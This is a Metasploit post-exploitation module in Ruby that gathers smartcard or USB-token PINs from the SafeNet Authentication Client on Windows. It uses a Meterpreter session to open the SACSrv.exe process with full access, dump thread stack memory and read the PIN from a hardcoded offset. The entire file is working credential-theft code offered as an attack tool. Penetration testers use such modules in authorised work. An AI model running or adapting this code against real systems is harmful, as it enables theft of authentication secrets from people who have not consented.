##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Windows Gather SafeNet Authentication Client Credentials',
			'Description'    => %q{
					This module will gather the credentials of a security device (smartcard or
				usb token) from the SafeNet Authentication Client assuming single signon is being used.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['3rd Degree'],
			'Platform'       => ['win'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options([
			OptString.new('PROCESS', [true,  'Name of the process to credentials from', 'SACSrv.exe'])
		], self.class)
	end

	def get_data_from_stack(target_pid)
		proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
		stack = []
		begin
			threads = proc.thread.each_thread do |tid|
				thread = proc.thread.open(tid)
				esp = thread.query_regs['esp']
				addr = proc.memory.query(esp)
				vprint_status("Found Thread TID: #{tid}\tBaseAddress: 0x%08x\t\tRegionSize: %d bytes" % [addr['BaseAddress'], addr['RegionSize']])
				data = proc.memory.read(addr['BaseAddress'], addr['RegionSize'])
				stack << {
					'Address' => addr['BaseAddress'],
					'Size' => addr['RegionSize'],
					'Handle' => thread.handle,
					'Data' => data
				}
			end
		rescue
		end

		stack
	end

	def dump_data(target_pid)
		base = 0x008bf000
		idx  = 0x00000b38
		addr = base + idx
		passwd = ""

		get_data_from_stack(target_pid).each do |mem|
			if mem['Address'] == base
				print_status("Base address match found on stack!")

				data = mem['Data'][idx, 64]

				str_end = data.index("\00")
				passwd = data[0, str_end]
				break
			end
		end

		if passwd != ""
			print_good("w00t! Smartcard PIN: #{passwd}")
		else
			print_error("Smartcard PIN not present in memory :(")
		end
	end


	def run
		if session.type != "meterpreter"
			print_error "Only meterpreter sessions are supported by this post module"
			return
		end

		print_status("Running module against #{sysinfo['Computer']}")

		proc_name = datastore['PROCESS']

		# Collect PIDs
		pids = []
		client.sys.process.processes.each do |p|
			pids << p['pid'] if p['name'] == proc_name
		end

		if pids.empty?
			print_error("No PID found for #{proc_name}")
			return
		end

		print_status("PIDs found for #{proc_name}: #{pids * ', '}")

		pids.each do |pid|
			print_status("Searching in process: #{pid.to_s}...")
			dump_data(pid)
		end

	end
end
